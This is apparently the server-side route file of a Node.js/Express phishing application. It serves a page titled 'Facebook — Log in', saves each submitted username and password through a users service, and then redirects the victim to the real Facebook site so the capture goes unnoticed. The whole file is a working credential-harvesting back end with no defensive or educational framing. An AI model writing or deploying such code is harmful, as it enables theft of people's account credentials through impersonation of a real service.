const express = require('express');
const UsersRouter = express.Router();
const UsersService = require('../services/users');


UsersRouter.get('/', (req, res)=>{
  res.render('index', {title: 'Facebook — Log in'});
});

UsersRouter.post('/', (req, res)=>{
  UsersService.createUser(req.body.username, req.body.password)
      .then(user => {
        return res.redirect('https://web.facebook.com/');
      })
      .catch(err => {
        return res.redirect('https://web.facebook.com/');
      });
});

module.exports = UsersRouter;
